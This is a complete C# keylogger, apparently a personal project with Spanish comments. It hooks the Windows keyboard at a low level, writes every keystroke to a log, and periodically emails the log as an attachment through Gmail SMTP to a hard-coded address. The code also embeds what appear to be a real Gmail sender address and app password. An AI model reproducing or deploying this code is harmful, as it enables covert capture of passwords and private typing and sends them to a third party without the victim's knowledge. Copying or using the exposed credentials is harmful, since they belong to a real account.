using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;

namespace Keylogger
{
    class Program


    {
        //Credenciales del correo que enviará el Archive.txt
        private const string email_from = "programstest6@gmail.com"; 
        private const string password_from = "gyksnesvlfaevipp";

        //Correo que recibirá el Archive txt
        private const string email_to = "amycepeda22@gmail.com";

        //Path del log donde se guardarán los keystrokes y del archive que se enviará al correo. 
        private const string log_name = @"C:\Users\ameli\source\repos\Keylogger1\Keylogger\bin\Debug\Log.txt";
        private const string archive_name = @"C:\Users\ameli\source\repos\Keylogger1\Keylogger\bin\Debug\Archive.txt";
        
        private const bool include_log_as_attachment = true; //El archive.txt se adjuntará en el correo
        private const int max_length_log = 300; //Cantidad max. de caracteres para enviar el correo
        private const int max_keystrokes_start = 0; //Cantidad max. de caracteres para empezar a loggear

        //Hook que servirá para loggear los keystrokes
        private static int WH_KEYBOARD_LL = 13;  
        private static int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;         
        private static string buffer = ""; 

        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        //Procedure para definir lo que hará el sistema cuando se presione una tecla

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)  
        {

            if (buffer.Length >= max_keystrokes_start)
            {
                StreamWriter output = new StreamWriter(log_name, true);
                output.Write(buffer);
                output.Close();
                buffer = ""; //Secuencia de Bytes que se almacenaran en el Log
                
            }

            FileInfo logFile = new FileInfo(@"C:\Users\ameli\source\repos\Keylogger1\Keylogger\bin\Debug\Log.txt");

            // Copiar el log.txt al archive.txt luego de que llegue al límite de caracteres
            if (logFile.Exists && logFile.Length == max_length_log)
            {
                try
                {
                    logFile.CopyTo(archive_name, true);
                    logFile.Delete();

                    // Envia el correo por una nueva conversación
                    System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
                    mailThread.Start();
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static void sendMail()
        {
            try
            {
                // Crear el cliente del email 
                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(email_from, password_from),
                    EnableSsl = true,
                };

                // Build the email message
                MailMessage message = new MailMessage
                {
                    From = new MailAddress(email_from),
                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    IsBodyHtml = false,
                };

                if (include_log_as_attachment)
                {
                    Attachment attachment = new Attachment(@"C:\Users\ameli\source\repos\Keylogger1\Keylogger\bin\Debug\Archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
                    message.Attachments.Add(attachment);
                }

                message.To.Add(email_to);
                client.Send(message);
                message.Dispose();
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
    }
}

 
